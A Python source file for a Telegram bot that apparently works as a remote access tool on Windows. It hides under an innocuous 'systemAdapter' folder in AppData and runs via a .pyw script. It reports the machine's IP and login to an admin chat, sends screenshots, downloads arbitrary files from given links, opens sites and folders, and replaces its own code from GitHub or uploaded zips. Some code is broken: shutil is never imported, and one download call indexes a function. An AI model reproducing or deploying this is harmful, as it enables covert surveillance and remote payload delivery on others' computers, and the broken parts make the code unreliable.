# Created by Delitel

from aiogram import Bot, executor, Dispatcher, types
from aiogram.utils import exceptions
import os
from db import SQLither
from config import cfg
import requests
import telebot
import lsKeyboard, lsUtils
from urllib.error import HTTPError
import zipfile
import time
import random
import wget

login = os.getlogin()
admin = cfg.admin_id

bot = Bot(cfg.token)
dp = Dispatcher(bot)
pybot = telebot.TeleBot(cfg.token)
db = SQLither(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\db.db")

def updating():
	try:
		link = "https://github.com/Delitel-WEB/tg_VRS/archive/master.zip"
		wget.download(link, f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
		zipper = zipfile.ZipFile(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master.zip")
		zipper.extract("tg_VRS-master/db.py", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
		zipper.extract("tg_VRS-master/lsKeyboard.py", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
		zipper.extract("tg_VRS-master/lsSetup.pyw", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
		zipper.extract("tg_VRS-master/lsUtils.py", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
		zipper.close()
			
		shutil.copy(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master\\db.py", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
		shutil.copy(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master\\lsKeyboard.py", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
		shutil.copy(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master\\lsSetup.pyw", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")
		shutil.copy(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master\\lsUtils.py", f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter")

		os.remove(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master.zip")
		files_ = ["db.py", "lsKeyboard.py", "lsSetup.pyw", "lsUtils.py"]
		for i in files_:
			os.remove(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master\\{i}")
		os.rmdir(f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\tg_VRS-master")

		mess_id = pybot.send_message(
			admin,
			f"<b>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ!</b>",
			parse_mode="html"
			)
		db.add_message_id(mess_id.message_id)
	except Exception as err:
		mess_id = pybot.send_message(
			admin,
			f"<b>–ù–µ —É–¥–∞–ª–æ—Å—å —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ!</b>\n\n{err}",
			parse_mode="html"
			)
		db.add_message_id(mess_id.message_id)



updating()
time.sleep(3)



def started_info():
	ip = requests.get("https://ramziv.com/ip").text

	keyboard = telebot.types.InlineKeyboardMarkup()
	keyboard_1 = telebot.types.InlineKeyboardButton(text= "üíª –ù–∞—á–∞—Ç—å —Ä–∞–±–æ—Ç—É", callback_data = "start_job")
	keyboard.add(keyboard_1)

	mess_id = pybot.send_message(
			admin,
			f"<b><u>üíª –ö–æ–º–ø—å—é—Ç–µ—Ä –∑–∞–ø—É—â–µ–Ω!</u></b>\n\n<b>üìç IP:</b> <i>{ip}</i>\n<b>üë§ –õ–æ–≥–∏–Ω –∫–æ–º–ø—å—Ç–µ—Ä–∞:</b> <i>{login}</i>",
			parse_mode="html",
			reply_markup=keyboard
			)
	db.add_message_id(mess_id.message_id)

async def deleted_messages(user_id):
	messages_delete = db.get_deletions_messages()
	for i in messages_delete:
		try:
			await bot.delete_message(user_id, i[1])
		except exceptions.MessageToDeleteNotFound:
			pass
		except exceptions.MessageCantBeDeleted:
			pass
		db.delete_deletions_message(i[1])

started_info()

@dp.message_handler(content_types=["text"])
async def message_handler(message):
	if not db.exists_user(message.chat.id):
		db.add_user(message.chat.id)
	status = db.get_status(message.chat.id)
	db.add_message_id(message.message_id)

	if status == "get_link_open_site":
		lsUtils.open_site(message.text)
		await deleted_messages(message.chat.id)

		mess_id = await message.answer(
			"<b>–ì–æ—Ç–æ–≤–æ!</b>",
			parse_mode="html",
			reply_markup=lsKeyboard.main_keyboard
			)
		db.add_message_id(mess_id.message_id)
		db.set_status(message.chat.id, 0)

	elif status == "add_link_file":
		db.add_link_to_temporary_download_file_data(message.chat.id, message.text)
		await deleted_messages(message.chat.id)

		mess_id = await message.answer(
			"<b>–í—ã —Ö–æ—Ç–∏—Ç–µ —É–∫–∞–∑–∞—Ç—å –ø—É—Ç—å –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è —Ñ–∞–π–ª–∞?</b>",
			parse_mode="html",
			reply_markup=lsKeyboard.use_file_path
			)
		db.add_message_id(mess_id.message_id)
		db.set_status(message.chat.id, 0)

	elif status == "use_file_path":
		db.add_file_path_to_temporary_download_file_data(message.chat.id, message.text)

		data = db.get_temporary_download_file_data(message.chat.id)

		await deleted_messages(message.chat.id)
		mess_id = await message.answer(
					"<b>–ù–∞—á–∏–Ω–∞–µ–º —Å–∫–∞—á–∏–≤–∞—Ç—å!</b>",
					parse_mode="html"
					)
		db.add_message_id(mess_id.message_id)

		try:
			if data[1]:
				lsUtils.download_file(data[0], data[1])
			else:
				lsUtils.download_file[data[0]]

			await deleted_messages(message.chat.id)
			mess_id = await message.answer(
			"<b>–ì–æ—Ç–æ–≤–æ!</b>",
			parse_mode="html",
			reply_markup=lsKeyboard.main_keyboard
			)
			db.add_message_id(mess_id.message_id)
			db.set_status(message.chat.id, 0)
		except ValueError:
			await deleted_messages(message.chat.id)
			mess_id = await message.answer(
					"<b>–í—ã –≤–≤–µ–ª–∏ –Ω–µ –ø—Ä–∞–≤–∏–ª—å–Ω—É—é —Å—Å—ã–ª–∫—É –Ω–∞ —Ñ–∞–π–ª –∏–ª–∏ –ø—É—Ç—å –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏!</b>",
					reply_markup=lsKeyboard.main_keyboard,
					parse_mode="html"

					)
			db.add_message_id(mess_id.message_id)
			db.set_status(message.chat.id, 0)
		except HTTPError as err:
			await deleted_messages(message.chat.id)
			mess_id = await message.answer(
					f"<b>{err}</b>",
					reply_markup=lsKeyboard.main_keyboard,
					parse_mode="html"
					)
			db.add_message_id(mess_id.message_id)
			db.set_status(message.chat.id, 0)

	elif status == "open_dir":
		lsUtils.open_dir(message.text)

		await deleted_messages(message.chat.id)
		mess_id = await message.answer(
					"<b>–ì–æ—Ç–æ–≤–æ!</b>",
					parse_mode="html",
					reply_markup=lsKeyboard.main_keyboard
					)
		db.add_message_id(mess_id.message_id)
		db.set_status(message.chat.id, 0)


@dp.message_handler(content_types=["document"])
async def document_handler(message):
	if not db.exists_user(message.chat.id):
		db.add_user(message.chat.id)
	status = db.get_status(message.chat.id)
	db.add_message_id(message.message_id)


	if status == "update_":
		if message.document.mime_type == "application/zip":
			await deleted_messages(message.chat.id)
			mess_id = await message.answer(
				f"<b>–ù–∞—á–∏–Ω–∞–µ–º –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ!</b>",
				parse_mode="html"
				)
			db.add_message_id(mess_id.message_id)

			mess_id_1 = await message.answer(
				f"ü§™",
				parse_mode="html"
				)
			db.add_message_id(mess_id_1.message_id)

			await deleted_messages(message.chat.id)
			mess_id_2 = await message.answer(
				f"<b><u>–ü—Ä–æ–≥—Ä–µ—Å—Åüìä</u>\n\n1) –£–¥–∞–ª–µ–Ω–∏–µ —Å—Ç–∞—Ä—ã—Ö —Ñ–∞–π–ª–æ–≤ ‚ùå\n"
				"2) –°–∫–∞—á–∏–≤–∞–Ω–∏–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è ‚ùå\n 3) –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è ‚ùå</b>",
				parse_mode="html"
				)
			db.add_message_id(mess_id_2.message_id) 

			for i in cfg.files:
				os.remove(i)

			await deleted_messages(message.chat.id)
			mess_id_3 = await message.answer(
				f"<b><u>–ü—Ä–æ–≥—Ä–µ—Å—Åüìä</u>\n\n1)<i> –£–¥–∞–ª–µ–Ω–∏–µ —Å—Ç–∞—Ä—ã—Ö —Ñ–∞–π–ª–æ–≤ ‚úÖ</i>\n"
				"2) –°–∫–∞—á–∏–≤–∞–Ω–∏–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è ‚ùå\n 3) –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è ‚ùå</b>",
				parse_mode="html"
				)
			db.add_message_id(mess_id_3.message_id) 

			await message.document.download("C:\\Users\\delit\\AppData\\Roaming\\systemAdapter\\update.zip")

			await deleted_messages(message.chat.id)
			mess_id_4 = await message.answer(
				f"<b><u>–ü—Ä–æ–≥—Ä–µ—Å—Åüìä</u>\n\n1)<i> –£–¥–∞–ª–µ–Ω–∏–µ —Å—Ç–∞—Ä—ã—Ö —Ñ–∞–π–ª–æ–≤ ‚úÖ</i>\n"
				"2) <i>–°–∫–∞—á–∏–≤–∞–Ω–∏–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è ‚úÖ</i>\n 3) –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è ‚ùå</b>",
				parse_mode="html"
				)
			db.add_message_id(mess_id_4.message_id)

			zipper = zipfile.ZipFile("C:\\Users\\delit\\AppData\\Roaming\\systemAdapter\\update.zip")
			zipper.extract("db.py", "C:\\Users\\delit\\AppData\\Roaming\\systemAdapter")
			zipper.extract("lsKeyboard.py", "C:\\Users\\delit\\AppData\\Roaming\\systemAdapter") 
			zipper.extract("lsSetup.pyw", "C:\\Users\\delit\\AppData\\Roaming\\systemAdapter") 
			zipper.extract("lsUtils.py", "C:\\Users\\delit\\AppData\\Roaming\\systemAdapter") 
			zipper.extract("cfg.py", "C:\\Users\\delit\\AppData\\Roaming\\systemAdapter\\config")
			zipper.close()

			await deleted_messages(message.chat.id)
			mess_id_5 = await message.answer(
				f"<b><u>–ü—Ä–æ–≥—Ä–µ—Å—Åüìä</u>\n\n1)<i> –£–¥–∞–ª–µ–Ω–∏–µ —Å—Ç–∞—Ä—ã—Ö —Ñ–∞–π–ª–æ–≤ ‚úÖ</i>\n"
				"2) <i>–°–∫–∞—á–∏–≤–∞–Ω–∏–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è ‚úÖ</i>\n 3) <i>–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è ‚úÖ</i></b>",
				parse_mode="html"
				)
			db.add_message_id(mess_id_5.message_id) 

			os.remove("C:\\Users\\delit\\AppData\\Roaming\\systemAdapter\\update.zip")

			await deleted_messages(message.chat.id)
			mess_id_5 = await message.answer(
				f"<b>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –∏ –±—É–¥–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å –ø–æ—Å–ª–µ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞!</b>",
				reply_markup=lsKeyboard.main_keyboard,
				parse_mode="html"
				)
			db.add_message_id(mess_id_5.message_id) 



		else:
			await deleted_messages(message.chat.id)
			mess_id = await message.answer(
				f"<b>–û—Ç–ø—Ä–∞–≤—å—Ç–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ <u>zip</u> –∞—Ä—Ö–∏–≤–æ–º!</b>",
				reply_markup=lsKeyboard.cancel_keyboard,
				parse_mode="html"

				)
			db.add_message_id(mess_id.message_id)




@dp.callback_query_handler()
async def query_handelr(call):
	if call.message:
		if not db.exists_user(call.message.chat.id):
			db.add_user(call.message.chat.id)
		status = db.get_status(call.message.chat.id)
		if call.message.chat.id == admin:

			if call.data == "start_job":
				db.set_status(call.message.chat.id, 0)
				await deleted_messages(call.message.chat.id)

				mess_id = await call.message.answer(
					"<b>–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:</b>",
					parse_mode="html",
					reply_markup = lsKeyboard.main_keyboard
					)
				db.add_message_id(mess_id.message_id)

			elif call.data == "make_screen":
				screen = lsUtils.make_screenshot()
				await deleted_messages(call.message.chat.id)
				photo = open(screen, "rb")
				mess_id = await bot.send_photo(call.message.chat.id ,photo, "<b>–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:</b>",
							parse_mode="html",
							reply_markup=lsKeyboard.main_keyboard
							)
				db.add_message_id(mess_id.message_id)
				os.remove(screen)

			elif call.data == "open_browser":
				db.set_status(call.message.chat.id ,"get_link_open_site")
				await deleted_messages(call.message.chat.id)
				mess_id = await call.message.answer(
					"<b>–í–≤–µ–¥–∏—Ç–µ —Å–∞–π—Ç –∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–Ω–æ –æ—Ç–∫—Ä—ã—Ç—å:</b>",
					reply_markup=lsKeyboard.cancel_keyboard,
					parse_mode="html"

					)
				db.add_message_id(mess_id.message_id)

			elif call.data == "cancel":
				db.set_status(call.message.chat.id, 0)
				await deleted_messages(call.message.chat.id)
				mess_id = await call.message.answer(
					"<b>–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:</b>",
					parse_mode="html",
					reply_markup = lsKeyboard.main_keyboard
					)
				db.add_message_id(mess_id.message_id)

			elif call.data == "download_file":
				db.delete_all_temporary_download_file_data(call.message.chat.id)
				db.set_status(call.message.chat.id, "add_link_file")

				await deleted_messages(call.message.chat.id)
				mess_id = await call.message.answer(
					"<b>–í–≤–µ–¥–∏—Ç–µ <u>–ø—Ä—è–º—É—é</u> —Å—Å—ã–ª–∫—É –Ω–∞ —Ñ–∞–π–ª:</b>",
					reply_markup=lsKeyboard.cancel_keyboard,
					parse_mode="html"

					)
				db.add_message_id(mess_id.message_id)

			elif call.data == "no_use_file_path":
				data = db.get_temporary_download_file_data(call.message.chat.id)

				await deleted_messages(call.message.chat.id)
				mess_id = await call.message.answer(
					"<b>–ù–∞—á–∏–Ω–∞–µ–º —Å–∫–∞—á–∏–≤–∞—Ç—å!</b>",
					parse_mode="html"
					)
				db.add_message_id(mess_id.message_id)

				try:
					if data[1]:
						lsUtils.download_file(data[0], data[1])
					else:
						lsUtils.download_file([data[0]])

					await deleted_messages(call.message.chat.id)
					mess_id = await call.message.answer(
					"<b>–ì–æ—Ç–æ–≤–æ!</b>",
					parse_mode="html",
					reply_markup=lsKeyboard.main_keyboard
					)
					db.add_message_id(mess_id.message_id)
					db.set_status(call.message.chat.id, 0)
				except ValueError:
					await deleted_messages(call.message.chat.id)
					mess_id = await call.message.answer(
					"<b>–í—ã –≤–≤–µ–ª–∏ –Ω–µ –ø—Ä–∞–≤–∏–ª—å–Ω—É—é —Å—Å—ã–ª–∫—É –Ω–∞ —Ñ–∞–π–ª!</b>",
					reply_markup=lsKeyboard.main_keyboard,
					parse_mode="html"

					)
					db.add_message_id(mess_id.message_id)
					db.set_status(call.message.chat.id, 0)
				except HTTPError as err:
					await deleted_messages(call.message.chat.id)
					mess_id = await call.message.answer(
					f"<b>{err}</b>",
					reply_markup=lsKeyboard.main_keyboard,
					parse_mode="html"

					)
					db.add_message_id(mess_id.message_id)
					db.set_status(call.message.chat.id, 0)

				db.set_status(call.message.chat.id, 0)



			elif call.data == "use_file_path":
				db.set_status(call.message.chat.id, "use_file_path")

				await deleted_messages(call.message.chat.id)
				mess_id = await call.message.answer(
					f"<b>–í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å —É—Å—Ç–∞–Ω–æ–≤–∫–∏\n\n–õ–æ–≥–∏–Ω —ç—Ç–æ–≥–æ –∫–æ–º–ø—å—Ç–µ—Ä–∞: <i>{login}</i></b>",
					reply_markup=lsKeyboard.cancel_keyboard,
					parse_mode="html"

					)
				db.add_message_id(mess_id.message_id)

			elif call.data == "check_ip":
				ip = lsUtils.get_ip()
				await deleted_messages(call.message.chat.id)
				mess_id = await call.message.answer(
					f"<b>üç≠ ip —ç—Ç–æ–≥–æ –∫–æ–º–ø—å—Ç–µ—Ä–∞ - <u>{ip}</u></b>",
					reply_markup=lsKeyboard.main_keyboard,
					parse_mode="html"

					)
				db.add_message_id(mess_id.message_id)

			elif call.data == "open_file":
				db.set_status(call.message.chat.id, "open_dir")

				mess_id = await call.message.answer(
					f"<b>–í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –¥–æ –ø–∞–ø–∫–∏!\n\n–õ–æ–≥–∏–Ω —ç—Ç–æ–≥–æ –ü–ö - <i>{login}</i></b>",
					reply_markup=lsKeyboard.cancel_keyboard,
					parse_mode="html"
				
					)
				db.add_message_id(mess_id.message_id)

				

			elif call.data == "update_":
				db.set_status(call.message.chat.id, "update_")

				await deleted_messages(call.message.chat.id)
				mess_id = await call.message.answer(
					f"<b>–û—Ç–ø—Ä–∞–≤—å—Ç–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ <u>zip</u> –∞—Ä—Ö–∏–≤–æ–º!</b>",
					reply_markup=lsKeyboard.cancel_keyboard,
					parse_mode="html"

					)
				db.add_message_id(mess_id.message_id)


			


if __name__ == "__main__":
	executor.start_polling(dp, skip_updates=True)